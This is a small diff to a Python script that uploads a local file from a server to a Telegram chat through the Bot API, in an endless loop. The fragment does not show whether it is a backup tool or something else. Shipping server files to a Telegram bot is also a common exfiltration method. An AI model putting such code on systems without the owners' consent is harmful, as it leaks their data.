@@ -24,7 +24,7 @@ FileName=spl1[t]
 #-------------------------------------------------------------------
 def upload():
     
-    requests.get(f"{token}/sendDocument?chat_id={chid}&caption=Server Name : {Name}",files={'document': (FileName, open(FileAddres, 'rb'))})
+    requests.get(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={chid}&caption=Server Name : {Name}",files={'document': (FileName, open(FileAddres, 'rb'))})
     print("uploaded")
 while True:
     upload()
